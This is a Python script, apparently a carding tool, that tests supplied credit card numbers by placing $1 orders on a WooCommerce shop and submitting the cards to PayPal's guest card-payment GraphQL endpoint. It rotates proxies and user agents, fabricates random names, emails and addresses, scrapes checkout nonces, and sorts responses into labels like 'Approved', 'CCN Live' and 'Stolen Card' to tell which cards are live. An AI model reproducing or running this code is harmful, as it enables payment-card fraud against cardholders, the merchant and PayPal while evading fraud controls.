import httpx
import asyncio
import random
import string
import re
import json
import time
import os
import logging

logger = logging.getLogger("ppnormal")

SITE_URL = "https://switchupcb.com"
PAYPAL_GQL = "https://www.paypal.com/graphql"

SITE_TIMEOUT = 25
PAYPAL_TIMEOUT = 20

PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]


def _ua():
    return random.choice(UA_LIST)


def _random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15)) + "@gmail.com"


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel",
             "Matthew", "Anthony", "Joseph", "Andrew", "Ryan", "Kevin", "Brian", "Steven", "Mark", "Edward"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Anderson",
            "Taylor", "Thomas", "Moore", "Martin", "Jackson", "Thompson", "White", "Harris", "Clark", "Lewis"]
    return random.choice(first), random.choice(last)


def _random_address():
    data = [
        ("123 Main St", "New York", "NY", "10001"),
        ("456 Oak Ave", "Los Angeles", "CA", "90001"),
        ("789 Pine Rd", "Chicago", "IL", "60601"),
        ("321 Elm St", "Houston", "TX", "77001"),
        ("654 Maple Dr", "Phoenix", "AZ", "85001"),
        ("111 Cedar Ln", "Seattle", "WA", "98101"),
        ("222 Birch Ct", "Denver", "CO", "80201"),
        ("333 Walnut Way", "Atlanta", "GA", "30301"),
        ("444 Spruce Blvd", "Miami", "FL", "33101"),
        ("555 Ash Pl", "Boston", "MA", "02101"),
        ("666 River Dr", "Portland", "OR", "97201"),
        ("777 Lake Rd", "Dallas", "TX", "75201"),
        ("888 Hill St", "San Diego", "CA", "92101"),
        ("999 Valley Ave", "San Jose", "CA", "95101"),
        ("100 Beach Blvd", "Tampa", "FL", "33601"),
    ]
    return random.choice(data)


def _get_global_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


async def ppnormal_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_date = f"{mm}/20{yy}"
    else:
        exp_date = f"{mm}/{yy}"
    mm = mm.zfill(2)

    first, last = _random_name()
    street, city, state, zipcode = _random_address()
    email = _random_email()
    phone = "303" + "".join(random.choices(string.digits, k=7))
    ua = _ua()

    working_proxy = None
    global_proxy = _get_global_proxy()
    candidates = []
    if proxy:
        candidates.append(proxy)
    if global_proxy and global_proxy != proxy:
        candidates.append(global_proxy)
    for p in candidates:
        try:
            async with httpx.AsyncClient(proxy=p, timeout=httpx.Timeout(3, connect=3), verify=False) as test_client:
                await test_client.head(SITE_URL, follow_redirects=True)
            working_proxy = p
            break
        except Exception:
            continue

    order_id = None
    last_error = None

    client_kwargs = dict(
        timeout=httpx.Timeout(SITE_TIMEOUT),
        max_redirects=10,
        headers={"User-Agent": ua},
        verify=False,
        follow_redirects=True,
    )
    if working_proxy:
        client_kwargs["proxy"] = working_proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            r_cart = await client.post(
                f"{SITE_URL}/shop/i-buy/",
                data={"add-to-cart": "4451", "quantity": "1"},
            )
            if r_cart.status_code not in (200, 301, 302):
                last_error = f"Cart failed ({r_cart.status_code})"

            if not last_error:
                r_checkout = await client.get(f"{SITE_URL}/checkout/")
                if r_checkout.status_code != 200:
                    last_error = f"Checkout failed ({r_checkout.status_code})"

            if not last_error:
                text = r_checkout.text
                create_nonce_m = re.search(r'create_order.*?nonce":"([^"]+)"', text)
                checkout_nonce_m = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', text)

                if not create_nonce_m or not checkout_nonce_m:
                    last_error = "Could not get checkout nonces"

            if not last_error:
                create_nonce = create_nonce_m.group(1)
                checkout_nonce = checkout_nonce_m.group(1)

                payload = {
                    "nonce": create_nonce,
                    "bn_code": "Woo_PPCP",
                    "context": "checkout",
                    "order_id": "0",
                    "payment_method": "ppcp-gateway",
                    "funding_source": "card",
                    "form_encoded": (
                        f"billing_first_name={first}&billing_last_name={last}"
                        f"&billing_country=US&billing_address_1={street}"
                        f"&billing_city={city}&billing_state={state}"
                        f"&billing_postcode={zipcode}&billing_phone={phone}"
                        f"&billing_email={email}&payment_method=ppcp-gateway"
                        f"&terms=on&woocommerce-process-checkout-nonce={checkout_nonce}"
                    ),
                }

                r_order = await client.post(
                    f"{SITE_URL}/?wc-ajax=ppc-create-order",
                    json=payload,
                    headers={
                        "Content-Type": "application/json",
                        "Referer": f"{SITE_URL}/checkout/",
                    },
                )

                try:
                    order_data = r_order.json()
                except Exception:
                    last_error = "Invalid order response"

            if not last_error:
                order_id = order_data.get("data", {}).get("id")
                if not order_id:
                    err_msg = order_data.get("data", {}).get("message", "")
                    last_error = f"No order ID: {err_msg[:50]}" if err_msg else "Could not create PayPal order"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        last_error = "Site timeout"
    except httpx.ConnectError:
        last_error = "Connection refused"
    except httpx.NetworkError:
        last_error = "Network error"
    except Exception as e:
        last_error = str(e)[:60]

    if not order_id:
        elapsed = round(time.time() - start, 2)
        return f"Error - {last_error or 'Site unreachable'} [{elapsed}s]"

    gql = {
        "query": """mutation payWithCard($token: String!, $card: CardInput!, $email: String, $billingAddress: AddressInput) {
            approveGuestPaymentWithCreditCard(token: $token, card: $card, email: $email, billingAddress: $billingAddress) {
                flags { is3DSecureRequired }
            }
        }""",
        "variables": {
            "token": order_id,
            "card": {
                "cardNumber": cc,
                "expirationDate": exp_date,
                "securityCode": cvv,
                "postalCode": zipcode,
            },
            "email": email,
            "billingAddress": {
                "givenName": first,
                "familyName": last,
                "line1": street,
                "city": city,
                "state": state,
                "postalCode": zipcode,
                "country": "US",
            },
        },
        "operationName": "payWithCard",
    }

    for attempt in range(2):
        try:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(PAYPAL_TIMEOUT),
                verify=False,
                follow_redirects=True,
            ) as pp_client:
                r_gql = await pp_client.post(
                    PAYPAL_GQL,
                    json=gql,
                    headers={
                        "Content-Type": "application/json",
                        "Origin": "https://www.paypal.com",
                        "User-Agent": ua,
                    },
                )
                result = r_gql.json()
                elapsed = round(time.time() - start, 2)

                txt = json.dumps(result).lower()

                if "thank you" in txt or "success" in txt:
                    return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"

                if "is3dsecurerequired" in txt:
                    flags = (
                        result.get("data", {})
                        .get("approveGuestPaymentWithCreditCard", {})
                        .get("flags", {})
                    )
                    if flags.get("is3DSecureRequired"):
                        return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
                    return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"

                live_indicators = [
                    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
                    "pickup_card", "restricted_card", "card_velocity_exceeded",
                ]
                for indicator in live_indicators:
                    if indicator in txt:
                        tag = indicator.replace("_", " ").title()
                        return f"Approved - {tag} | {cc[:6]} [{elapsed}s]"

                if "incorrect_cvv" in txt or "invalid_security_code" in txt:
                    return f"Approved - CCN Live | {cc[:6]} [{elapsed}s]"

                if "processor_declined" in txt or "issuer_decline" in txt:
                    return f"Declined - Issuer Decline | {cc[:6]} [{elapsed}s]"

                if "card_generic_error" in txt:
                    return f"Declined - Card Error | {cc[:6]} [{elapsed}s]"

                if "invalid_card_number" in txt:
                    return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"

                if "expired_card" in txt:
                    return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"

                errors = result.get("errors", [])
                if errors:
                    msg = errors[0].get("message", "Unknown")
                    retryable_words = ["internal", "timeout", "unavailable", "server"]
                    if any(w in msg.lower() for w in retryable_words) and attempt < 1:
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                        continue
                    return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"

                return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"

        except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
            if attempt < 1:
                await asyncio.sleep(0.5)
                continue
            elapsed = round(time.time() - start, 2)
            return f"Error - PayPal Timeout [{elapsed}s]"
        except httpx.NetworkError:
            if attempt < 1:
                await asyncio.sleep(0.5)
                continue
            elapsed = round(time.time() - start, 2)
            return f"Error - Network Error [{elapsed}s]"
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - {str(e)[:80]} [{elapsed}s]"

    elapsed = round(time.time() - start, 2)
    return f"Error - Max retries exceeded [{elapsed}s]"
